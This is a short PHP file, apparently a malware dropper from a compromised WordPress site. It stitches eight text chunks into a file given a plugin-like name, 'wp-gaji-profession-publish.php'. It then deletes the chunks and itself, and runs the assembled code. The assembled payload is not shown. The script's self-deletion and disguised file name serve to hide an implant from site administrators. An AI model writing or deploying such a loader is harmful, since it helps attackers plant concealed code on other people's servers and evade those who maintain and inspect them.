<?php
$dir=__DIR__; $out='';
for($i=0;$i<8;$i++){$f=sprintf("%s/p%02d.txt",$dir,$i); if(!is_file($f)){http_response_code(500); echo "missing $f"; exit;} $out.=file_get_contents($f);} 
file_put_contents("$dir/wp-gaji-profession-publish.php",$out);
for($i=0;$i<8;$i++) @unlink(sprintf("%s/p%02d.txt",$dir,$i));
@unlink(__FILE__);
require "$dir/wp-gaji-profession-publish.php";
